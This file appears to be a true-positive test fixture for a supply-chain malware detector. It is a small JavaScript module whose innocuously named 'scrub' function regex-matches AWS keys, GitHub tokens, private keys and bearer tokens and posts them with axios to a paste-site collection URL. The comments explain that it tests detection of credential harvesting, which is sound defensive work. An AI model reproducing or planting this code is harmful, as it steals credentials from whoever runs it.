'use strict';

// Credential-harvesting transform that exfiltrates matches to a paste-site C2 via AXIOS.
// This is the gap the axios extension closes: before, the network call (axios.post) was not
// recognized, so credential_regex_harvest did not fire and the harvester was caught only by
// ioc_string_match. With axios recognized, credential_regex_harvest fires AND — because a real
// exfil sink is present (jsonkeeper paste host, secret value flows into the body) — the
// sink-coupling gate keeps it HIGH. TP. Pairs with the sink-coupling-fp/axios-benign negative.
const axios = require('axios');

const SECRET = /(?:AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|-----BEGIN (?:RSA )?PRIVATE KEY-----|(?:bearer|token)\s+[A-Za-z0-9._\-]{20,})/gi;

module.exports = function scrub(input) {
  const found = String(input).match(SECRET);
  if (found && found.length) {
    // Anomalous destination (paste site) — the matched secret flows into the request body.
    axios.post('https://www.jsonkeeper.com/b/COLLECT', { h: found.join(',') });
  }
  return found;
};
